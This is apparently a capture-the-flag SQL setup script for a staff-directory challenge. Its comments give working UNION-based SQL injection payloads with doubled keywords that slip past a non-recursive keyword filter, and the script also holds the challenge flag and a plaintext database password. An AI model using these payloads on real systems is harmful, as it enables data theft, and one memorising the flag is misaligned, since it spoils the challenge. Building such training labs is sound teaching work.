-- Challenge: Filter Bypass SQLi
-- Students search a staff directory. Input is "sanitized" by stripping SQL keywords,
-- but str_ireplace() is non-recursive, so double-keyword payloads bypass the filter.
-- e.g., SELSELECTECT -> after stripping SELECT -> SELECT
--
-- Intended solution:
--   1. Confirm injection with: ' UNUNIONION SELSELECTECT 1,2,3/*
--   2. Enumerate tables:       ' UNUNIONION SELSELECTECT table_name,2,3 FROM information_schema.tables WHERE table_schema='filterbypass'/*
--   3. Extract flag:           ' UNUNIONION SELSELECTECT flag,2,3 FROM employees_metadata/*

CREATE DATABASE IF NOT EXISTS `filterbypass`;
USE `filterbypass`;

DROP TABLE IF EXISTS `staff`;
CREATE TABLE `staff` (
  `id` int(9) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `department` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `staff` (`name`, `department`) VALUES
('Alice Johnson',   'Engineering'),
('Bob Martinez',    'Marketing'),
('Carol White',     'Human Resources'),
('Dave Brown',      'Engineering'),
('Eve Davis',       'Finance'),
('Frank Lee',       'IT Support'),
('Grace Kim',       'Engineering'),
('Henry Patel',     'Legal');

-- Flag table — non-obvious name to require enumeration
DROP TABLE IF EXISTS `employees_metadata`;
CREATE TABLE `employees_metadata` (
  `id` int(9) NOT NULL AUTO_INCREMENT,
  `flag` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- TODO: Replace the flag value below with the hash from your scoreboard ctf_flags table
INSERT INTO `employees_metadata` (`flag`) VALUES ('key{e6e4a692cb4bf3bb47ba159d1d7d3fea000a78f0d278445d6c9678fb0e8c0e08}');

-- DB user (same password convention as the rest of the CTF)
CREATE USER IF NOT EXISTS 'ctf2026filter'@'localhost' IDENTIFIED BY 'ItWasAllDiegosFault';
GRANT SELECT ON `filterbypass`.* TO 'ctf2026filter'@'localhost';
FLUSH PRIVILEGES;
